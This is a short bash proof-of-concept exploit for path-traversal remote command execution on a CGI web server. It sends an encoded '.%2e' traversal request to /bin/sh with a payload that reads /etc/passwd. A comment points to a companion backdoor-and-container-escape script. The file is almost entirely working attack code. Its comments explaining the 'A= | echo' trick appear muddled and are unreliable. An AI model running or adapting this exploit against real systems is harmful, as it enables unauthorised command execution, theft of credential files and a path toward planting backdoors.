#!/bin/bash
# This is a basic RCE PoC; for an exploit that integrates with container escape, see scripts/install_backdoor.sh
host='localhost:3000'
payload="cat /etc/passwd"
curl "$host/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "A= | echo; $payload"
# The command that runs on the remote machine is:
# '/bin/sh A=|echo; $payload' (this is based on CGI scripting conventions). The "A="" part will cause an
# error "A=: No such file or directory", and when we pipe that to echo with " | echo", this can be thought of as 
# "consuming" the error, which prevents it from being made visible to httpd, so our subsequent payload command
# gets a chance to execute (if we didn't consume the error, we get a 500 result)
